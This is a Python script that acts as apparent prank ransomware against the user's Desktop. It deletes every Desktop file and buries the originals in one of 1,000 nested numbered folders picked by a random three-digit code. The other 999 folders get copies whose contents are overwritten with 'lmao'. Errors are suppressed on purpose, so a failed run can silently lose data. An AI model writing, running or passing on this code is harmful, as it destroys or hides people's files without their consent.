import math
import os
import random
import shutil
from distutils.dir_util import copy_tree
from pathlib import Path


def main():
    desktop_location = os.path.join(Path.home(), "Desktop")

    if not os.path.exists(desktop_location):
        exit()

    print(desktop_location)
    holding_dir_name = "TEMP"
    bad_holding_dir_name = "BTEMP"

    # holding locations
    holding_location = os.path.join(desktop_location, holding_dir_name)
    bad_holding_location = os.path.join(desktop_location, bad_holding_dir_name)

    # find all files inside the desktop_location
    files = os.listdir(desktop_location)

    # copy all files on desktop to backup location
    os.makedirs(holding_location, exist_ok=True)
    os.makedirs(bad_holding_location, exist_ok=True)
    copy_tree(desktop_location, holding_location)
    copy_tree(desktop_location, bad_holding_location)

    # remove the temp folder copied into the temp folders (recusion)
    shutil.rmtree(os.path.join(holding_location, holding_dir_name))
    shutil.rmtree(os.path.join(holding_location, bad_holding_dir_name))
    shutil.rmtree(os.path.join(bad_holding_location, bad_holding_dir_name))
    shutil.rmtree(os.path.join(bad_holding_location, holding_dir_name))

    # unwrite bad holding dir
    for (dirpath, dirnames, filenames) in os.walk(bad_holding_location):
        for filename in filenames:
            # TODO: Copy relative file structure
            with open(os.path.join(dirpath,filename), "w") as file:
                file.write("lmao")

    # delete files from desktop_location
    for file in files:
        try:
            os.remove(os.path.join(desktop_location, file))
        except PermissionError:
            shutil.rmtree(os.path.join(desktop_location, file))

    # generate code
    code_length = 3
    code = int(random.random()*math.pow(10, code_length))
    print(f"Code: {code}")

    # generate folders
    for folder_num in range(0, int(math.pow(10, code_length))):
        folder_str = str(folder_num).zfill(code_length)
        folder = os.path.join(desktop_location,*list(str(folder_str)))
        os.makedirs(folder, exist_ok=True)

        if folder_num == code:
            copy_tree(holding_location, folder)
        else:
            copy_tree(bad_holding_location, folder)

    # delete temp folder
    shutil.rmtree(holding_location)
    shutil.rmtree(bad_holding_location)

if __name__ == "__main__":
    try:
        main()
    except Exception:
        # quiet fail intentional
        exit()
